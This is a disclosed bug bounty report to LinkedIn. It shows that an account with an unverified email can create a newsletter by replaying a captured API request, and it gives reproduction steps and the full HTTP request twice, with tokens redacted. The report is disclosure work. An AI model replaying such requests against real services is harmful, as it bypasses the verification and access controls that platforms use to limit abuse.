# A Unverified User Can Post Newsletter (Which Is Not Allowed Through Application UI)

## Report Details
- **Report ID**: 1691603
- **URL**: https://hackerone.com/reports/1691603
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-09-07T15:06:55.209Z
- **Disclosed**: 2023-08-24T02:53:38.402Z

## Reporter
- **Username**: tushar6378
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: linkedin

## Vulnerability Information
During the security testing, It has been observed that multiple features are not accessible to the unverified user( the user who did not verify the email) .. like :
i) Creating posts and articles. 
ii) Sending connection and message Requests
iii) Liking posts
Also, For the unverified user, The API ```POST /voyager/api/publishing/normFirstPartyArticle```  gives 403 error 
and also there is no option to create the Newsletter in the application UI.
██████
But if we directly send the below request with the unverified user cookie ..it will be possible to create a new Newsletter.
```
POST /voyager/api/publishing/contentSeries HTTP/2
Host: www.linkedin.com
Cookie: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/vnd.linkedin.normalized+json+2.1
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Li-Lang: en_US
X-Li-Track: {"clientVersion":"1.11.265","mpVersion":"1.11.265","osName":"web","timezoneOffset":5.5,"timezone":"Asia/Kolkata","deviceFormFactor":"DESKTOP","mpName":"voyager-web","displayDensity":1,"displayWidth":1440,"displayHeight":900}
X-Li-Page-Instance: urn:li:page:d_flagship3_publishing_post_edit;███████
Csrf-Token: ajax:████
X-Restli-Protocol-Version: 2.0.0
X-Li-Pem-Metadata: Voyager - Article Creator=create-series-model
Content-Type: application/json; charset=utf-8
Content-Length: 185
Origin: https://www.linkedin.com
Dnt: 1
Referer: https://www.linkedin.com/post/edit/███
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"title":"dfghjk","description":"dgfhjkcgvhbjnkm","publishFrequency":{"duration":2,"unit":"MONTH"},"inviteTargetAudiences":true,"logoUrn":"urn:li:digitalmediaAsset:█████"}
```
## Steps :
1) Sign up for an account on Linkedin
2) Without verifying the email, jump directly to the URL : https://www.linkedin.com/post/new/ to write an article 
3) It can be seen that there is no option to create a  Newsletter. 
██████████
4) Now Login into the account where the Email is verified and try to create a newsletter.
████████
5) Click on Done and capture the vulnerable request and replay the request with the unverified user cookies.
and the newsletter will be successfully created.
████████

## Vulnerable Request 
```
POST /voyager/api/publishing/contentSeries HTTP/2
Host: www.linkedin.com
Cookie: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/vnd.linkedin.normalized+json+2.1
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Li-Lang: en_US
X-Li-Track: {"clientVersion":"1.11.265","mpVersion":"1.11.265","osName":"web","timezoneOffset":5.5,"timezone":"Asia/Kolkata","deviceFormFactor":"DESKTOP","mpName":"voyager-web","displayDensity":1,"displayWidth":1440,"displayHeight":900}
X-Li-Page-Instance: urn:li:page:d_flagship3_publishing_post_edit;█████
Csrf-Token: ajax:█████████
X-Restli-Protocol-Version: 2.0.0
X-Li-Pem-Metadata: Voyager - Article Creator=create-series-model
Content-Type: application/json; charset=utf-8
Content-Length: 185
Origin: https://www.linkedin.com
Dnt: 1
Referer: https://www.linkedin.com/post/edit/██████
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"title":"dfghjk","description":"dgfhjkcgvhbjnkm","publishFrequency":{"duration":2,"unit":"MONTH"},"inviteTargetAudiences":true,"logoUrn":"urn:li:digitalmediaAsset:████"}
```

## Impact

A Unverified User can Create Newsletter Even if it is not allowed through the application UI which violets the business logic of the application .

## Attachments
No attachments
